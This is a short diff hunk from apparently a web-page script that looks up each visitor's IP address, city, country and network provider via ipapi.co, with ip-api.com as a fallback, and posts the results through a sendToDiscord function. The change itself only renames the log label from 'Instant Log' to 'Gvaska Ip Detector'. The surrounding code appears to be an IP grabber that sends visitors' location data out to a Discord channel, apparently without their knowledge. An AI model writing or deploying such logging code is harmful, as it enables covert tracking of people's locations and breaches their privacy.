@@ -37,7 +37,7 @@
         try {
             const res = await fetch('https://ipapi.co/json/');
             const d = await res.json();
-            await sendToDiscord("🚀 Instant Log (ipapi)", d.ip, d.city, d.country_name, d.org);
+            await sendToDiscord("🚀 Gvaska Ip Detector", d.ip, d.city, d.country_name, d.org);
         } catch (e) {
             // მეთოდი 2: თუ პირველმა არ იმუშავა, ვიყენებთ ip-api.com-ს
             try {
